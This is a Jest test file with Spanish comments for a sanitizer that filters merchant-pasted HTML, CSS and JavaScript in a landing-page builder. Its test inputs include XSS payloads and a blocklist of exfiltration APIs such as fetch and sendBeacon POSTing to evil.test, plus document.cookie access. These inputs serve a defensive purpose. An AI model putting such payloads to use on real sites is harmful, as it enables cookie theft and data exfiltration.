/**
 * Sanitizador del lienzo en blanco (services/landingCodigo.service.js).
 * Test puro: no toca la base ni levanta el servidor — es la única pieza
 * del modo código que decide qué se guarda, así que conviene tenerla
 * cubierta sola.
 */

const LandingCodigoService = require('../services/landingCodigo.service');

describe('LandingCodigoService.sanitizar', () => {

  describe('HTML', () => {
    it('conserva el marcado normal de una landing', () => {
      const html = '<section class="hero" data-anim="fade"><h1>Hola</h1><p>Texto</p>'
        + '<a class="cta" href="https://gesicomm.com">Comprar</a>'
        + '<img src="https://cdn.test/foto.jpg" alt="foto" loading="lazy"></section>';
      const { html: limpio, advertencias } = LandingCodigoService.sanitizar({ html });
      expect(limpio).toContain('class="hero"');
      expect(limpio).toContain('data-anim="fade"');
      expect(limpio).toContain('href="https://gesicomm.com"');
      expect(limpio).toContain('src="https://cdn.test/foto.jpg"');
      expect(advertencias).toHaveLength(0);
    });

    it('descarta <script> y su contenido', () => {
      const { html, advertencias } = LandingCodigoService.sanitizar({
        html: '<div>ok</div><script>alert(document.cookie)</script>',
      });
      expect(html).toBe('<div>ok</div>');
      expect(html).not.toContain('alert');
      expect(advertencias.join(' ')).toMatch(/script/i);
    });

    // Ver el CONTRATO en la cabecera del servicio: los onclick sobreviven
    // porque el HTML solo se renderiza dentro del iframe sandbox, y sin
    // ellos no funciona ninguna plantilla pegada de afuera.
    it('conserva atributos de evento inline', () => {
      const { html } = LandingCodigoService.sanitizar({
        html: '<button onclick="siguiente()" onmouseover="resaltar()">Click</button>',
      });
      expect(html).toBe('<button onclick="siguiente()" onmouseover="resaltar()">Click</button>');
    });

    it('aplica el blocklist del JS también a los atributos de evento', () => {
      expect(() => LandingCodigoService.sanitizar({
        html: `<button onclick="fetch('//evil')">x</button>`,
      })).toThrow('Validación fallida.');

      try {
        LandingCodigoService.sanitizar({ html: '<div onload="document.cookie">x</div>' });
        throw new Error('debió lanzar');
      } catch (err) {
        expect(err.errores.join(' ')).toMatch(/atributo de evento/i);
      }
    });

    it('descarta href javascript: pero deja mailto/tel', () => {
      const { html } = LandingCodigoService.sanitizar({
        html: '<a href="javascript:alert(1)">a</a><a href="mailto:h@x.com">b</a><a href="tel:+595981000000">c</a>',
      });
      expect(html).not.toContain('javascript:');
      expect(html).toContain('mailto:h@x.com');
      expect(html).toContain('tel:+595981000000');
    });

    it('permite embeber YouTube pero no un iframe de cualquier host', () => {
      const { html } = LandingCodigoService.sanitizar({
        html: '<iframe src="https://www.youtube.com/embed/abc"></iframe><iframe src="https://phishing.test/x"></iframe>',
      });
      expect(html).toContain('https://www.youtube.com/embed/abc');
      expect(html).not.toContain('phishing.test');
    });

    it('conserva SVG inline', () => {
      const { html } = LandingCodigoService.sanitizar({
        html: '<svg viewBox="0 0 24 24" fill="none"><path d="M4 4h16" stroke="currentColor"/></svg>',
      });
      expect(html).toContain('<svg');
      expect(html).toContain('d="M4 4h16"');
    });

    it('rechaza un HTML por encima del límite de tamaño', () => {
      const gigante = '<p>x</p>'.repeat(LandingCodigoService.MAX_HTML);
      expect(() => LandingCodigoService.sanitizar({ html: gigante }))
        .toThrow('Validación fallida.');
    });
  });

  describe('CSS', () => {
    it('deja pasar CSS normal, incluido url() de imágenes y fuentes', () => {
      const css = '.hero { background: url(https://cdn.test/bg.jpg) center/cover; }\n'
        + '@media (max-width: 600px) { .hero { padding: 16px; } }';
      const { css: limpio, advertencias } = LandingCodigoService.sanitizar({ css });
      expect(limpio).toBe(css);
      expect(advertencias).toHaveLength(0);
    });

    it('quita @import, expression() y url(javascript:)', () => {
      const { css, advertencias } = LandingCodigoService.sanitizar({
        css: '@import url("//evil.test/x.css");\nbody { color: red; }\n.a { width: expression(alert(1)); }\n.b { background: url(javascript:alert(1)); }',
      });
      expect(css).toContain('body { color: red; }');
      expect(css).not.toMatch(/@import/i);
      expect(css).not.toMatch(/expression\s*\(/i);
      expect(css).not.toMatch(/javascript:/i);
      expect(advertencias.length).toBeGreaterThanOrEqual(3);
    });

    it('permite scroll-behavior pero sigue quitando la propiedad behavior peligrosa', () => {
      const { css, advertencias } = LandingCodigoService.sanitizar({
        css: 'html { scroll-behavior: smooth; }\n.ie { behavior: url(x.htc); }',
      });
      expect(css).toContain('scroll-behavior: smooth');
      expect(css).not.toContain('url(x.htc)');
      expect(advertencias.join(' ')).toMatch(/behavior:/);
    });

    it('no deja cerrar el <style> del documento', () => {
      const { css } = LandingCodigoService.sanitizar({
        css: 'body{color:red}\n</style><script>alert(1)</script>',
      });
      expect(css).not.toMatch(/<\s*\/?\s*(style|script)/i);
    });
  });

  describe('JavaScript', () => {
    it('acepta el JS típico de una landing', () => {
      const js = [
        "document.querySelectorAll('.faq-item').forEach((el) => {",
        "  el.addEventListener('click', () => el.classList.toggle('abierto'));",
        '});',
      ].join('\n');
      const resultado = LandingCodigoService.sanitizar({ js });
      expect(resultado.js).toBe(js);
      expect(resultado.advertencias).toHaveLength(0);
    });

    it.each([
      ['document.cookie', 'const c = document.cookie;'],
      ['localStorage', "localStorage.setItem('a', 1);"],
      ['parent', "window.parent.location = 'https://evil.test';"],
      ['fetch', "fetch('https://evil.test', { method: 'POST' });"],
      ['XMLHttpRequest', 'new XMLHttpRequest();'],
      ['eval', "eval('alert(1)');"],
      ['new Function', "new Function('alert(1)')();"],
      ['sendBeacon', "navigator.sendBeacon('https://evil.test', 'x');"],
      ['document.write', "document.write('<h1>x</h1>');"],
      ['postMessage', "postMessage('x', '*');"],
    ])('rechaza el guardado si el JS usa %s', (_etiqueta, js) => {
      expect(() => LandingCodigoService.sanitizar({ js })).toThrow('Validación fallida.');
    });

    it('no rechaza palabras prohibidas cuando aparecen solo dentro de comentarios', () => {
      const js = [
        '/*',
        '  No usamos fetch.',
        '  No usamos localStorage.',
        '*/',
        "document.querySelector('button')?.addEventListener('click', () => console.log('ok'));",
      ].join('\n');

      expect(() => LandingCodigoService.sanitizar({ js })).not.toThrow();
    });

    it('el error lista cada motivo, para poder mostrarlos en el editor', () => {
      try {
        LandingCodigoService.sanitizar({ js: "fetch('/x'); document.cookie;" });
        throw new Error('debió lanzar');
      } catch (err) {
        expect(err.errores).toHaveLength(2);
        expect(err.errores.join(' ')).toMatch(/fetch/);
        expect(err.errores.join(' ')).toMatch(/document\.cookie/);
      }
    });
  });

  // El caso real: el comercio pega una plantilla entera en la pestaña
  // HTML. Antes quedaba una landing muerta — el <style> y el <script> se
  // descartaban y sobrevivía solo el marcado pelado.
  describe('documento HTML completo pegado en la pestaña HTML', () => {
    const documento = [
      '<!DOCTYPE html>',
      '<html lang="es"><head>',
      '<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter">',
      '<style>:root { --radius: 26px; } .hero { min-height: 100vh; }</style>',
      '</head><body>',
      '<section class="hero"><h1>Hola</h1></section>',
      '<button onclick="siguiente()">Siguiente</button>',
      '<script>function siguiente() { console.log(1); }</script>',
      '</body></html>',
    ].join('\n');

    it('reparte <style> y <script> en sus campos y deja solo el <body>', () => {
      const r = LandingCodigoService.sanitizar({ html: documento });
      expect(r.html).not.toMatch(/<!doctype|<html[\s>]|<head[\s>]|<style|<script/i);
      expect(r.html).toContain('<section class="hero">');
      expect(r.css).toContain('--radius: 26px');
      expect(r.js).toContain('function siguiente()');
      expect(r.advertencias.join(' ')).toMatch(/página completa/i);
    });

    it('rescata el <link> del <head> para no perder la fuente', () => {
      const { html } = LandingCodigoService.sanitizar({ html: documento });
      expect(html).toContain('fonts.googleapis.com');
    });

    it('suma lo extraído DESPUÉS de lo que ya había en css/js', () => {
      const r = LandingCodigoService.sanitizar({
        html: documento,
        css: 'body { background: #000; }',
        js: 'const inicial = 1;',
      });
      expect(r.css.indexOf('background: #000')).toBeLessThan(r.css.indexOf('--radius'));
      expect(r.js.indexOf('const inicial')).toBeLessThan(r.js.indexOf('function siguiente'));
    });

    it('descarta <script src> externo y lo avisa', () => {
      const r = LandingCodigoService.sanitizar({
        html: '<html><body><p>x</p><script src="https://cdn.test/a.js"></script></body></html>',
      });
      expect(r.js).toBe('');
      expect(r.advertencias.join(' ')).toMatch(/script src/i);
    });

    it('no toca un fragmento normal (sin doctype/html/body)', () => {
      const r = LandingCodigoService.sanitizar({ html: '<section><h1>Hola</h1></section>' });
      expect(r.html).toBe('<section><h1>Hola</h1></section>');
      expect(r.advertencias).toHaveLength(0);
    });
  });

  it('rechaza un código que no sea un objeto {html, css, js}', () => {
    expect(() => LandingCodigoService.sanitizar('<h1>x</h1>')).toThrow('Validación fallida.');
    expect(() => LandingCodigoService.sanitizar(null)).toThrow('Validación fallida.');
    expect(() => LandingCodigoService.sanitizar([])).toThrow('Validación fallida.');
  });

  /**
   * El Page Builder reutiliza este mismo sanitizador con límites propios,
   * más altos (ver builderPageVersion.service.js). Estos tests fijan el
   * contrato de esa extensión: llamarlo SIN opciones tiene que seguir
   * comportándose exactamente como antes, o la extensión habría cambiado
   * en silencio el comportamiento de las landings.
   */
  describe('límites por parámetro (contrato con el Page Builder)', () => {

    it('sin opciones usa los límites de una landing, como siempre', () => {
      const html = `<p>${'a'.repeat(LandingCodigoService.MAX_HTML)}</p>`;
      expect(() => LandingCodigoService.sanitizar({ html }))
        .toThrow('Validación fallida.');
    });

    it('con un límite más alto, ese mismo HTML entra', () => {
      const html = `<p>${'a'.repeat(LandingCodigoService.MAX_HTML)}</p>`;
      const r = LandingCodigoService.sanitizar({ html }, { maxHtml: 500 * 1024 });
      expect(r.html).toContain('<p>');
    });

    it('el tope total corta aunque cada campo entre en el suyo', () => {
      expect(() => LandingCodigoService.sanitizar(
        { html: `<p>${'a'.repeat(60 * 1024)}</p>`, css: `/*${'b'.repeat(60 * 1024)}*/` },
        { maxTotal: 100 * 1024 },
      )).toThrow('Validación fallida.');
    });

    it('devuelve el tamaño en bytes de lo que quedó', () => {
      const r = LandingCodigoService.sanitizar({ html: '<p>hola</p>', css: 'p{color:red}' });
      expect(r.bytes).toBe(
        Buffer.byteLength(r.html, 'utf8')
        + Buffer.byteLength(r.css, 'utf8')
        + Buffer.byteLength(r.js, 'utf8'),
      );
    });
  });
});
